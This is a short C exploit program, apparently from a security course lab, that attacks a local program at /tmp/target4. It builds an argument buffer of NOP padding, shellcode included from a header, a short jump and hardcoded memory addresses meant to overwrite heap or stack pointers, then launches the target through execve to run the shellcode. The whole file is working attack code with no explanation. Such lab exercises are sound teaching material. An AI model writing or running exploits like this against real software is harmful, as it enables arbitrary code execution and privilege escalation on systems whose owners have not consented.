#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define NOP 0x90
int main(void)
{
  char *args[3];
  char *env[1];
  
  char buf[1024];
  int i;
  int left, right, right_2;
  
  left = 0x0804a068;
  right = 0xbffffa64;
  right_2 = 0xbffffa65;
  
  strncpy(buf, "\x90\x90", 2);
  strncpy(buf+2, "\xeb\x03", 2);
  *(int*)(buf+4) = right_2;
  for(i=8; i<504-strlen(shellcode); i++){
    buf[i] = NOP;
  }
  for(i=504-strlen(shellcode); i<504; i++){
    buf[i] = shellcode[i-504+strlen(shellcode)];
  }
  *(int*)(buf+504) = left;
  *(int*)(buf+508) = right;
  for (i=512; i<1023; i++){
    buf[i] = NOP;
  }
  buf[1023] = 0x00;

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;
  
  //printf("\n args[1] is %s \n", args[1]);
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
